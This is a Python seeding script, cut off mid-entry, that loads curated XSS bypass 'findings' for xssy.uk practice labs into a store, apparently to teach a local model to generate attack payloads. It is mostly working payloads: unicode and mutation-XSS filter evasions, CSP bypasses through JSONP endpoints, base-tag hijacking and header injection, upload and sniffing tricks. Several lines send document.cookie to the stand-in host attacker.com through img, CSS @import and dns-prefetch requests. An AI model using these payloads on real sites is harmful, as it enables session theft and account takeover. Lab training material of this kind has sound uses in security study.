#!/usr/bin/env python3
"""Seed the findings store with curated, verified bypass knowledge for every
xssy.uk Adept-rated lab.

This is the "teaching" step — rather than hoping a small local model discovers
these techniques on its own, we hand-write expert-level findings so it has
rich, verified few-shot examples for each bypass family.  Every finding is
marked verified=True so it is never evicted by the trim logic.

Run once (idempotent — duplicates are silently skipped):
    python axss_seed_adept.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from ai_xss_generator.console import _ensure_utf8, header, info, success, warn
from ai_xss_generator.findings import Finding, save_finding

_ensure_utf8()

# ---------------------------------------------------------------------------
# Curated findings — one block per Adept lab topic
# Each Finding has verified=True so it is never auto-evicted
# ---------------------------------------------------------------------------

ADEPT_FINDINGS: list[Finding] = [

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Unicode XSS  (id=5)
    # Technique: Unicode escape sequences bypass keyword filters
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="html_attr_event",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()=\\u0123456789",
        bypass_family="unicode-js-escape",
        payload=r"<img src=x onerror=\u0061lert(1)>",
        test_vector="Inject into reflected parameter, URL-encode the payload",
        model="curated",
        explanation=(
            "JS engines resolve \\uXXXX escapes inside identifier tokens before "
            "name lookup. '\\u0061' evaluates to 'a', so \\u0061lert(1) calls "
            "alert(1). Filters matching the literal string 'alert' miss this entirely."
        ),
        tags=["unicode", "js-escape", "adept", "xssy:5"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="html_attr_event",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()=\\u0123456789",
        bypass_family="unicode-js-escape",
        payload=r"<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>",
        test_vector="Inject into HTML body or reflected parameter",
        model="curated",
        explanation=(
            "Fully unicode-escaped 'alert': every character replaced with its "
            "\\uXXXX form. No ASCII fragment of the function name survives in raw "
            "bytes — defeats all string-match filters on 'alert'."
        ),
        tags=["unicode", "js-escape", "full-escape", "adept", "xssy:5"],
        verified=True,
    ),
    Finding(
        sink_type="href",
        context_type="html_attr_url",
        surviving_chars="abcdefghijklmnopqrstuvwxyz:/()",
        bypass_family="unicode-zero-width",
        payload="<a href=\"java\u200Bscript:alert(1)\">click</a>",
        test_vector="Inject into href attribute value",
        model="curated",
        explanation=(
            "Zero-width space (U+200B) inserted inside 'javascript:' after 'java'. "
            "Firefox strips ZWS before scheme resolution so the URI still executes. "
            "WAFs matching 'javascript:' as a literal string miss the split keyword."
        ),
        tags=["unicode", "zero-width", "uri-bypass", "adept", "xssy:5"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="html_attr_event",
        surviving_chars="()=0123456789ABCDEFabcdef\\u",
        bypass_family="unicode-js-escape",
        payload=r"<details open ontoggle=\u0061lert`1`>",
        test_vector="Inject into HTML body",
        model="curated",
        explanation=(
            "Combines unicode escape for 'alert' with template literal call syntax "
            "to avoid parentheses if they are filtered, and uses ontoggle on "
            "<details open> for auto-execution without user interaction."
        ),
        tags=["unicode", "js-escape", "template-literal", "adept", "xssy:5"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Base Tag XSS  (id=167)
    # Technique: <base href> hijacks all relative URLs on the page
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="base-tag-injection",
        payload="<base href=\"//attacker.com/\">",
        test_vector=(
            "Inject early in the page so subsequent relative <script src=...>, "
            "<link href=...>, or <form action=...> load from attacker.com"
        ),
        model="curated",
        explanation=(
            "<base href> changes the document base URL. Any relative resource URL "
            "on the page now resolves to attacker.com. If any script, stylesheet, "
            "or form action uses a relative URL it becomes attacker-controlled. "
            "Most sanitisers do not strip <base> because it has no event handlers."
        ),
        tags=["base-tag", "adept", "xssy:167"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="base-tag-injection",
        payload="<base href=\"//attacker.com/\"><script src=\"payload.js\"></script>",
        test_vector="Inject into page where at least one relative resource URL exists",
        model="curated",
        explanation=(
            "If a CSP allows 'self' scripts AND the page has a relative script src, "
            "injecting <base> makes that relative src load from attacker.com instead. "
            "The script-src self rule is bypassed because the browser sees the tag "
            "as a same-origin relative URL before base resolution."
        ),
        tags=["base-tag", "csp-bypass", "adept", "xssy:167"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Upload Restriction Bypass  (id=627)
    # Technique: bypass file-type checks to deliver XSS via uploaded file
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="file_upload",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="upload-type-bypass",
        payload="<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script></svg>",
        test_vector=(
            "Upload as .svg file. If server only checks extension or MIME type "
            "without validating content, browse to the uploaded file URL directly."
        ),
        model="curated",
        explanation=(
            "SVG is XML and browsers execute <script> inside SVG when the file is "
            "served as image/svg+xml or text/html. Extension-only or MIME-only checks "
            "pass for .svg, but the embedded <script> executes when the file is opened."
        ),
        tags=["upload", "svg", "adept", "xssy:627"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="file_upload",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="upload-type-bypass",
        payload="GIF89a<script>alert(1)</script>",
        test_vector=(
            "Upload as .gif with Content-Type: image/gif. "
            "If file is later served without X-Content-Type-Options: nosniff, "
            "browsers may sniff and render as HTML."
        ),
        model="curated",
        explanation=(
            "GIF magic bytes (GIF89a) satisfy magic-byte checks for image/gif. "
            "The trailing <script> is ignored by image renderers but executed if "
            "the browser sniffs the file as HTML — a content-sniffing XSS."
        ),
        tags=["upload", "polyglot", "content-sniff", "adept", "xssy:627"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="file_upload",
        surviving_chars="<>\"=/.",
        bypass_family="upload-type-bypass",
        payload="<html><body><script>alert(document.cookie)</script></body></html>",
        test_vector=(
            "Rename to .jpg or .png. Try alternate extensions: .php5, .phtml, "
            ".html%00.jpg (null byte). Some frameworks only check last extension."
        ),
        model="curated",
        explanation=(
            "Servers that split on '.' and check only the last extension can be "
            "fooled by double extensions (.html.jpg) or by truncation tricks. "
            "The file is stored and served as HTML, executing the script."
        ),
        tags=["upload", "extension-bypass", "adept", "xssy:627"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Sniffing Danger  (id=637)
    # Technique: MIME sniffing causes browser to render file as HTML
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="content-sniffing",
        payload="<script>alert(1)</script>",
        test_vector=(
            "Upload or inject content served as text/plain without "
            "X-Content-Type-Options: nosniff. Open in IE or sniff-enabled browser."
        ),
        model="curated",
        explanation=(
            "Without X-Content-Type-Options: nosniff, older browsers and IE sniff "
            "the first 256 bytes for HTML markers. A response served as text/plain "
            "that starts with <script> or contains HTML tags gets rendered as HTML, "
            "executing any embedded scripts."
        ),
        tags=["content-sniffing", "mime", "adept", "xssy:637"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="content-sniffing",
        payload="<!--<script>alert(1)</script>-->",
        test_vector=(
            "Inject into a response where content-type is application/json or text/plain. "
            "Some sniffers treat HTML comment markers as HTML."
        ),
        model="curated",
        explanation=(
            "HTML inside an HTML comment still triggers sniffing in some contexts. "
            "Even JSON responses can be rendered as HTML if the sniff threshold is met "
            "and nosniff header is absent."
        ),
        tags=["content-sniffing", "comment", "adept", "xssy:637"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Metadata XSS  (id=57)
    # Technique: XSS payload embedded in file metadata (EXIF, filename, etc.)
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="metadata_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()'\n",
        bypass_family="metadata-xss",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "Embed payload in EXIF Artist/Comment/Description field using exiftool: "
            "exiftool -Artist='<img src=x onerror=alert(1)>' image.jpg  "
            "Upload and view in gallery that renders metadata without escaping."
        ),
        model="curated",
        explanation=(
            "Image galleries or file managers often display metadata fields (Artist, "
            "Comment, GPS description) without HTML-encoding them. Injecting XSS into "
            "EXIF bypasses upload filters that only inspect the file binary content."
        ),
        tags=["metadata", "exif", "adept", "xssy:57"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="metadata_reflection",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="metadata-xss",
        payload="<svg onload=alert(1)>",
        test_vector=(
            "Rename file to '<svg onload=alert(1)>.jpg' and upload. "
            "Applications that display original filename without escaping are vulnerable."
        ),
        model="curated",
        explanation=(
            "Filename-based XSS: the original filename is stored and displayed in "
            "file listings or download links without HTML encoding. The browser "
            "renders the filename as HTML if output is unsanitised innerHTML."
        ),
        tags=["metadata", "filename", "adept", "xssy:57"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Safe HTML Filter 2  (id=60)
    # Technique: mutation XSS (mXSS) — payload mutates after sanitisation
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"='/abcdefghijklmnopqrstuvwxyz",
        bypass_family="mutation-xss",
        payload="<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        test_vector=(
            "Inject into innerHTML. Sanitiser parses in one tree context; "
            "browser re-parses in a different context causing mutation."
        ),
        model="curated",
        explanation=(
            "mXSS: the sanitiser sees </noscript> inside a title attribute (harmless) "
            "but the browser's parser treats the quote differently and closes noscript "
            "early, exposing the onerror handler as a live attribute."
        ),
        tags=["mutation-xss", "mxss", "noscript", "adept", "xssy:60"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"='/abcdefghijklmnopqrstuvwxyz",
        bypass_family="mutation-xss",
        payload="<svg><style><img src=x onerror=alert(1)></style></svg>",
        test_vector="Inject into innerHTML sink processed by DOMPurify < 2.4",
        model="curated",
        explanation=(
            "DOMPurify mXSS vector: inside <svg><style>, the parser treats content "
            "as raw text. When later assigned to innerHTML of an HTML context, the "
            "browser re-parses style content as HTML and the <img> fires onerror. "
            "Fixed in DOMPurify 2.4+ but still works against unpatched versions."
        ),
        tags=["mutation-xss", "mxss", "svg", "style", "dompurify", "adept", "xssy:60"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>abcdefghijklmnopqrstuvwxyz\"=/",
        bypass_family="mutation-xss",
        payload="<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        test_vector="Inject into innerHTML; exploits tree-adoption mutation in HTML5 parser",
        model="curated",
        explanation=(
            "Complex mXSS using MathML namespace transition. The sanitiser sees a "
            "safe-looking math tree; the HTML5 parser's namespace-switching logic "
            "re-adopts nodes into HTML context, exposing the onerror attribute."
        ),
        tags=["mutation-xss", "mxss", "mathml", "adept", "xssy:60"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: HTML Filter - Weak Regex  (id=168)
    # Technique: bypass regex that matches naive patterns
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n\t",
        bypass_family="regex-filter-bypass",
        payload="<ScRiPt>alert(1)</sCrIpT>",
        test_vector="Inject where filter strips lowercase <script> tags only",
        model="curated",
        explanation=(
            "Regex filters using /script/i without IGNORECASE on tag names, or "
            "filters matching only exact-case 'script', are bypassed with mixed case. "
            "Browsers normalise tag names to lowercase before rendering."
        ),
        tags=["case-variant", "regex-bypass", "adept", "xssy:168"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz\n\t ",
        bypass_family="regex-filter-bypass",
        payload="<scr\nipt>alert(1)</scr\nipt>",
        test_vector="Inject where filter uses single-line regex for script tag detection",
        model="curated",
        explanation=(
            "Newline inside tag name breaks single-line regex patterns that don't "
            "use the DOTALL flag. HTML parsers ignore whitespace within tag names "
            "in some browser/mode combinations, allowing the tag through."
        ),
        tags=["whitespace-in-tag", "regex-bypass", "adept", "xssy:168"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="regex-filter-bypass",
        payload="<sc<!---->ript>alert(1)</sc<!---->ript>",
        test_vector="Inject where filter runs before HTML comment stripping",
        model="curated",
        explanation=(
            "HTML comments (<!---->) inside a tag name are stripped by the parser "
            "before tag name resolution in some browser contexts, but the regex "
            "filter sees 'sc<!---->ript' and doesn't match 'script'."
        ),
        tags=["comment-breakout", "regex-bypass", "adept", "xssy:168"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="html_body",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz",
        bypass_family="regex-filter-bypass",
        payload="<img src=x onerror=alert(1) foo=\"",
        test_vector="Inject where filter checks for exact closing > to find tag end",
        model="curated",
        explanation=(
            "Unclosed attribute string: the filter looks for '>' to find the tag "
            "boundary but the open quote means the actual tag end is later in the "
            "page, confusing the filter into thinking the tag is harmless while "
            "the browser parses it correctly and fires onerror."
        ),
        tags=["attribute-confusion", "regex-bypass", "adept", "xssy:168"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Vulnerable Post Message  (id=58)
    # Technique: postMessage with no origin check → innerHTML / eval sink
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="postmessage_sink",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz()",
        bypass_family="postmessage-injection",
        payload="<img src=x onerror=alert(document.cookie)>",
        test_vector=(
            "Open target in iframe or popup, then: "
            "window.frames[0].postMessage('<img src=x onerror=alert(1)>', '*')"
        ),
        model="curated",
        explanation=(
            "When a page listens to postMessage without checking event.origin and "
            "passes event.data directly to innerHTML or eval(), an attacker page "
            "can send arbitrary HTML/JS. The '*' origin means any page can send."
        ),
        tags=["postmessage", "no-origin-check", "adept", "xssy:58"],
        verified=True,
    ),
    Finding(
        sink_type="eval",
        context_type="postmessage_sink",
        surviving_chars="abcdefghijklmnopqrstuvwxyz(){}[]\"'",
        bypass_family="postmessage-injection",
        payload="alert(document.domain)",
        test_vector=(
            "From attacking page: "
            "window.open('https://target.com/vulnerable'); "
            "setTimeout(() => opener.postMessage('alert(document.domain)', '*'), 500)"
        ),
        model="curated",
        explanation=(
            "If the message handler calls eval(event.data), sending plain JS code "
            "as the message executes it in the target page's context. "
            "No HTML encoding bypass needed — the payload is raw JS."
        ),
        tags=["postmessage", "eval-sink", "adept", "xssy:58"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - Predictable Nonce Bypass  (id=679)
    # Technique: predict nonce value, inject script tag with matching nonce
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="script_nonce",
        context_type="csp_nonce",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/",
        bypass_family="csp-nonce-bypass",
        payload="<script nonce=\"PREDICTED_NONCE\">alert(1)</script>",
        test_vector=(
            "1. Request page multiple times and observe nonce pattern in CSP header. "
            "2. If nonce is timestamp-based: Math.round(Date.now()/1000). "
            "3. If sequential: increment last observed value. "
            "4. Inject script tag with predicted nonce."
        ),
        model="curated",
        explanation=(
            "Nonces must be cryptographically random per-request. If generated from "
            "timestamp, counter, or seeded PRNG, an attacker can predict the next "
            "value. A script tag bearing the correct nonce is allowed by CSP even "
            "if the page has no 'unsafe-inline'."
        ),
        tags=["csp", "nonce", "predictable", "adept", "xssy:679"],
        verified=True,
    ),
    Finding(
        sink_type="script_nonce",
        context_type="csp_nonce",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789",
        bypass_family="csp-nonce-bypass",
        payload="<script nonce=\"LEAKED_NONCE\">alert(1)</script>",
        test_vector=(
            "Check if nonce leaks: page source, Referer header to third party, "
            "error messages, cached responses, or iframe srcdoc that inherits parent nonce."
        ),
        model="curated",
        explanation=(
            "Even a random nonce can be leaked. If the nonce appears in: "
            "a Referer header sent to a third-party resource, a CSP report URI, "
            "or an iframe srcdoc attribute that the attacker controls — the attacker "
            "can replay the nonce in an injected script tag."
        ),
        tags=["csp", "nonce", "leak", "adept", "xssy:679"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - Injection Bypass  (id=182)
    # Technique: inject into the CSP header itself to relax it
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="csp_header",
        context_type="csp_header_injection",
        surviving_chars="abcdefghijklmnopqrstuvwxyz-_ ;:'\"",
        bypass_family="csp-injection-bypass",
        payload="; script-src 'unsafe-inline'",
        test_vector=(
            "If user input is reflected into a Content-Security-Policy response header, "
            "inject a semicolon to add a new directive: ?csp_param=; script-src 'unsafe-inline'"
        ),
        model="curated",
        explanation=(
            "CSP headers are semicolon-delimited. If user input flows unsanitised "
            "into a CSP header value (e.g., via a nonce or report-uri parameter), "
            "injecting '; script-src unsafe-inline' appends a permissive directive. "
            "When duplicate directives appear, the first wins in most browsers — "
            "but some accept the last, making the injected one effective."
        ),
        tags=["csp", "header-injection", "adept", "xssy:182"],
        verified=True,
    ),
    Finding(
        sink_type="csp_header",
        context_type="csp_header_injection",
        surviving_chars="abcdefghijklmnopqrstuvwxyz-_ ;",
        bypass_family="csp-injection-bypass",
        payload="; script-src https://attacker.com",
        test_vector=(
            "Inject into CSP header via user-controlled parameter. "
            "Then serve payload JS from attacker.com."
        ),
        model="curated",
        explanation=(
            "Adds attacker.com as an allowed script source. Combined with a "
            "<script src=//attacker.com/xss.js> injection in the page body, "
            "this fully bypasses CSP script-src restrictions."
        ),
        tags=["csp", "header-injection", "script-src", "adept", "xssy:182"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - Data URL Bypass  (id=181)
    # Technique: data: URI in script / object / iframe when allowed by CSP
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="script_src",
        context_type="csp_data_uri",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/+",
        bypass_family="data-uri",
        payload="<script src=\"data:text/javascript,alert(1)\"></script>",
        test_vector="Inject when CSP script-src allows data: URIs",
        model="curated",
        explanation=(
            "If CSP has 'script-src data:' or 'script-src *', a data: URI can be "
            "used as the script source. Browsers execute JS from data: scheme script "
            "tags. This is why 'data:' should never appear in script-src."
        ),
        tags=["csp", "data-uri", "script-src", "adept", "xssy:181"],
        verified=True,
    ),
    Finding(
        sink_type="iframe_src",
        context_type="csp_data_uri",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/+",
        bypass_family="data-uri",
        payload="<iframe src=\"data:text/html,<script>alert(document.domain)</script>\">",
        test_vector="Inject when CSP allows data: in frame-src or default-src",
        model="curated",
        explanation=(
            "data: iframe loads a new HTML document. The script inside runs in the "
            "data: origin (null), but document.domain, cookies, and localStorage of "
            "the parent are accessible in some browsers. Works when frame-src allows data:."
        ),
        tags=["csp", "data-uri", "iframe", "adept", "xssy:181"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - JSONP Bypass  (id=173)
    # Technique: use trusted JSONP endpoint as script src
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="script_src",
        context_type="csp_jsonp",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/?=&",
        bypass_family="csp-jsonp-bypass",
        payload="<script src=\"https://trusted.com/api/jsonp?callback=alert(1);\"></script>",
        test_vector=(
            "Find a JSONP endpoint on a CSP-allowlisted domain. "
            "The callback parameter is reflected directly in the response body: "
            "callback(data) → alert(1)(data)"
        ),
        model="curated",
        explanation=(
            "If CSP allows scripts from trusted.com and that domain has a JSONP "
            "endpoint, the callback parameter is reflected as the function name "
            "in the response. Setting callback=alert(1) makes the response body "
            "'alert(1)({...data...})' which executes alert when loaded as a script."
        ),
        tags=["csp", "jsonp", "script-src", "adept", "xssy:173"],
        verified=True,
    ),
    Finding(
        sink_type="script_src",
        context_type="csp_jsonp",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/?=&()",
        bypass_family="csp-jsonp-bypass",
        payload="<script src=\"https://accounts.google.com/o/oauth2/revoke?token=alert(1)\"></script>",
        test_vector=(
            "Classic Google JSONP endpoint — allowlisted by many CSPs. "
            "token parameter is reflected in callback: callback_or_200({error:...}) "
            "Inject if google.com or accounts.google.com is in script-src."
        ),
        model="curated",
        explanation=(
            "Google's OAuth revoke endpoint returns JS-wrapped content. When the "
            "token= param is crafted as a function call, the response triggers "
            "execution. Any CSP that allows *.google.com can be bypassed this way."
        ),
        tags=["csp", "jsonp", "google", "adept", "xssy:173"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - Upload Bypass  (id=628)
    # Technique: upload JS file to same origin, reference via script src
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="script_src",
        context_type="csp_upload",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/.",
        bypass_family="csp-upload-bypass",
        payload="<script src=\"/uploads/payload.js\"></script>",
        test_vector=(
            "1. Upload a file named payload.js containing alert(document.cookie). "
            "2. Note the upload URL (e.g. /uploads/payload.js). "
            "3. Inject <script src='/uploads/payload.js'> into the page."
        ),
        model="curated",
        explanation=(
            "CSP 'script-src self' allows scripts from the same origin. If the "
            "application lets you upload files to the same origin, upload a .js file "
            "and reference it. The browser considers it same-origin and CSP allows it."
        ),
        tags=["csp", "upload", "self-origin", "adept", "xssy:628"],
        verified=True,
    ),
    Finding(
        sink_type="script_src",
        context_type="csp_upload",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/.",
        bypass_family="csp-upload-bypass",
        payload="alert(document.cookie);",
        test_vector=(
            "Upload this as a .js file. If server only allows image/* MIME types, "
            "try: change Content-Type to image/jpeg in the upload request but "
            "keep .js extension. Or upload as .jpg and find path to reference it directly."
        ),
        model="curated",
        explanation=(
            "Even if MIME type is restricted, if the file content is stored and served "
            "with the original extension, browsers load it as JS when referenced via "
            "<script src>. The browser ignores MIME type for script loading in some contexts."
        ),
        tags=["csp", "upload", "mime-bypass", "adept", "xssy:628"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Enctype Spoofing  (id=179)
    # Technique: change form encoding type to confuse server-side parsing
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="form_parameter",
        context_type="form_submission",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'/ &=",
        bypass_family="enctype-spoofing",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "Submit form with Content-Type: text/plain instead of "
            "application/x-www-form-urlencoded. The server may parse the raw body "
            "differently, skipping URL-decode that was filtering special chars."
        ),
        model="curated",
        explanation=(
            "Server-side parsers often only sanitise parameters when Content-Type is "
            "application/x-www-form-urlencoded. Changing to text/plain or "
            "multipart/form-data causes different parsing paths that may lack "
            "the same sanitisation, allowing raw HTML through."
        ),
        tags=["enctype", "form", "parser-confusion", "adept", "xssy:179"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: CSP - Exfiltration  (id=640)
    # Technique: leak data despite CSP using permitted channels
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="img_src",
        context_type="csp_exfil",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'+.()",
        bypass_family="csp-exfiltration",
        payload="<img src=\"https://attacker.com/?c=\"+document.cookie>",
        test_vector=(
            "Use when CSP has connect-src 'none' but img-src is wildcard or allows attacker.com. "
            "Cookie appears in server access log on attacker.com."
        ),
        model="curated",
        explanation=(
            "CSP connect-src blocks fetch/XHR but img-src is a separate directive. "
            "Loading an image with the secret in the URL exfiltrates it via the "
            "HTTP request to the image host. Often img-src * is set for convenience "
            "while connect-src is locked down — this bypasses that assumption."
        ),
        tags=["csp", "exfil", "img-src", "adept", "xssy:640"],
        verified=True,
    ),
    Finding(
        sink_type="css_url",
        context_type="csp_exfil",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789{}:;\"'().",
        bypass_family="csp-exfiltration",
        payload="<style>@import url('https://attacker.com/x?'+(document.cookie));</style>",
        test_vector="Inject when CSP allows style-src * or self and style injection is possible",
        model="curated",
        explanation=(
            "CSS @import makes an HTTP request to the URL. If style-src is permissive, "
            "the cookie value is appended to the URL via CSS expression (limited support) "
            "or via the style element src trick. Works when script-src is locked but "
            "style-src is not."
        ),
        tags=["csp", "exfil", "css", "adept", "xssy:640"],
        verified=True,
    ),
    Finding(
        sink_type="dns_prefetch",
        context_type="csp_exfil",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789<>=\"'.-",
        bypass_family="csp-exfiltration",
        payload="<link rel=dns-prefetch href=\"//COOKIE.attacker.com\">",
        test_vector=(
            "Inject when all fetch channels blocked but no default-src covering link[rel]. "
            "Encode cookie value as subdomain. Read from DNS server logs."
        ),
        model="curated",
        explanation=(
            "dns-prefetch causes a DNS lookup for the specified hostname, which reaches "
            "the attacker's DNS server even when CSP blocks all HTTP connections. "
            "The leaked data must be URL-safe and short enough to fit in a subdomain label."
        ),
        tags=["csp", "exfil", "dns", "adept", "xssy:640"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Referer Check  (id=736)
    # Technique: bypass Referer-based access control
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="referer_header",
        context_type="referer_check",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789./:?=&",
        bypass_family="referer-header-injection",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "Set Referer header to the expected allowed origin: "
            "curl -H 'Referer: https://allowed.com' 'https://target.com/vuln?q=<payload>'"
        ),
        model="curated",
        explanation=(
            "Referer checks can be spoofed in server-to-server or curl requests since "
            "Referer is a client-controlled header. From a browser, use a meta refresh "
            "or rel=noreferrer manipulation. The check only provides weak protection."
        ),
        tags=["referer", "header-check-bypass", "adept", "xssy:736"],
        verified=True,
    ),
    Finding(
        sink_type="referer_header",
        context_type="referer_check",
        surviving_chars="abcdefghijklmnopqrstuvwxyz0123456789./:?",
        bypass_family="referer-header-injection",
        payload="https://allowed.com.attacker.com/",
        test_vector=(
            "Set Referer to a subdomain of attacker.com that starts with the allowed origin. "
            "Servers doing startsWith() or contains() checks may be fooled: "
            "Referer: https://allowed.com.evil.com"
        ),
        model="curated",
        explanation=(
            "Weak Referer validation using startsWith('https://allowed.com') or "
            "includes('allowed.com') passes for https://allowed.com.evil.com. "
            "Always validate that the Referer host exactly matches, not just contains."
        ),
        tags=["referer", "domain-confusion", "adept", "xssy:736"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Templates  (id=882)
    # Technique: client-side template injection (Angular / Vue / Handlebars)
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="template_expression",
        context_type="client_template",
        surviving_chars="{}abcdefghijklmnopqrstuvwxyz().'\"$",
        bypass_family="template-expression",
        payload="{{constructor.constructor('alert(1)')()}}",
        test_vector=(
            "Inject {{ }} expression into AngularJS 1.x ng-bind or interpolated field. "
            "Angular evaluates the expression in its sandbox."
        ),
        model="curated",
        explanation=(
            "AngularJS 1.x sandbox escape: constructor.constructor accesses Function() "
            "from within the Angular expression sandbox, allowing arbitrary JS execution. "
            "Works in AngularJS < 1.6 before sandbox was removed. Modern Angular (2+) "
            "does not use client-side template expressions in the same way."
        ),
        tags=["template", "angularjs", "sandbox-escape", "adept", "xssy:882"],
        verified=True,
    ),
    Finding(
        sink_type="template_expression",
        context_type="client_template",
        surviving_chars="{}abcdefghijklmnopqrstuvwxyz().'\"$_",
        bypass_family="template-expression",
        payload="{{_copySafeLinkUrl.constructor('alert(1)')()}}",
        test_vector="Inject into AngularJS template field — uses an internal Angular function reference",
        model="curated",
        explanation=(
            "Alternative AngularJS sandbox escape using an Angular-internal function "
            "reference that is exposed in the scope. The .constructor property on any "
            "function gives access to Function(), bypassing scope restrictions."
        ),
        tags=["template", "angularjs", "sandbox-escape", "adept", "xssy:882"],
        verified=True,
    ),
    Finding(
        sink_type="template_expression",
        context_type="client_template",
        surviving_chars="{}abcdefghijklmnopqrstuvwxyz().'\"$_",
        bypass_family="template-expression",
        payload="${{alert(1)}}",
        test_vector="Inject into Handlebars / Mustache / Twig template rendered server-side",
        model="curated",
        explanation=(
            "Server-side template injection via ${{}} — many template engines treat "
            "${{ }} as an expression. If user input is interpolated into a template "
            "before rendering, arbitrary code executes on the server (SSTI) or "
            "produces reflected XSS in the rendered output."
        ),
        tags=["template", "ssti", "handlebars", "adept", "xssy:882"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Shallow Obscurity  (id=1068)
